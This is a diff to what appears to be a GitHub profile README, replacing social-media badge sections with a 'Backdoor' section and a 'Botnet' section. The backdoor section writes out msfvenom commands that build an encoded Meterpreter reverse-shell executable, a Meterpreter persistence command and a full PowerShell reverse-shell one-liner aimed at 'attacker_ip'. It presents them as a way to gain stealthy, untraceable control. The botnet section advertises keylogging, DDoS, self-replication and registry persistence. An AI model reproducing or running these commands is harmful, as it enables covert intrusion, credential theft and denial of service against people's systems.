@@ -45,21 +45,62 @@
 
 <hr>
 
-<h2 align="center">💬 My backdoor</h2>
-<p align="center" align='right'>
-  <a target="_blank"href="https://dev.to/ileriayo"><img src="https://img.shields.io/badge/dev.to-%2312100E.svg?&style=for-the-badge&logo=dev.to&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;
-  <a target="_blank"href="https://medium.com/@ileriayoadebiyi"><img src="https://img.shields.io/badge/Medium%20-%231572B6.svg?&style=for-the-badge&logo=medium&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;
-</p>
+<div align="center">
+
+# 🚪 Backdoor
+
+This backdoor utilizes **Metasploit** and the **Meterpreter** payload for remote control and invisibility. The exploitation is performed with the following command:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > backdoor.exe
+
+
+Once executed, a **reverse shell** is established:
+
+meterpreter > sessions -i 1
+
+
+Invisibility is achieved through **obfuscation** and **encryption**:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -f exe > backdoor.exe
+
+
+Persistence is configured with:
+
+meterpreter > run persistence -X -i 5 -p 4444 -r attacker_ip
+
+
+Result: **Undetectable**, **self-sustaining**, and **perfect** control.
+
+### 🔥 Advanced Technique: Living off the Land (LoL)
+
+Once the initial backdoor is set up, a more uncommon and powerful technique is **Living off the Land (LoL)**. This technique uses existing tools on the target system to execute malicious commands without triggering antivirus or detection systems.
+
+### Example using PowerShell:
+
+Instead of using a typical payload, you can directly use **PowerShell** to execute a **reverse shell** in memory, without saving any files to disk:
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker_ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object Text.UTF8Encoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
+
+
+This method avoids detection because it utilizes built-in system tools, making it much harder to trace.
+
+Result: With this combination of **Metasploit**, **Meterpreter**, and the **Living off the Land** technique, you achieve **stealth**, **persistence**, and **untraceable** control over the target system.
+
+</div>
+
 
 <hr>
 
-<h2  align="center">📫 BOT NET</h2>
-<p align="center">
-  <a target="_blank"href="https://www.linkedin.com/in/ileriayo-adebiyi-0328b1101/"><img src="https://img.shields.io/badge/linkedin-%230077B5.svg?&style=for-the-badge&logo=linkedin&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-  <a target="_blank"href="https://twitter.com/ileriayooo"><img src="https://img.shields.io/badge/twitter-%231DA1F2.svg?&style=for-the-badge&logo=twitter&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-  <a href="mailto:ileriayoadebiyi@gmail.com?subject=Hello%20Ileri,%20From%20Github"><img src="https://img.shields.io/badge/gmail-%23D14836.svg?&style=for-the-badge&logo=gmail&logoColor=white" /></a>&nbsp;&nbsp;&nbsp;&nbsp;
-</p>
+<div align="center">
 
-<hr>
+# 💻 My Botnet - Full Control and Destruction
 
-<h2  align="center">💻 G ⬇️ </h2>
+This botnet is designed to give **full control** over compromised systems, featuring **keylogging**, **DDoS attacks**, **self-replication**, and more. It's built in **Python**, ensuring flexibility, speed, and stealth.
+
+### Key Features:
+
+- **Keylogger**: Monitors and logs all keystrokes made on the infected system, capturing sensitive data like passwords, messages, and other private information.
+- **DDoS Attack**: The botnet can launch **Distributed Denial of Service (DDoS)** attacks on specified targets, overwhelming them with traffic and taking them offline.
+- **Self-Replication**: The botnet has the ability to **replicate itself** across other devices in the network, ensuring its spread and persistence.
+- **Remote Access**: Once the target is compromised, it allows full **remote control** over the system, enabling commands to be executed on it.
+- **Persistence**: The botnet can maintain its presence on the system, even after reboots, by using techniques such as modifying registry keys and autorun settings.
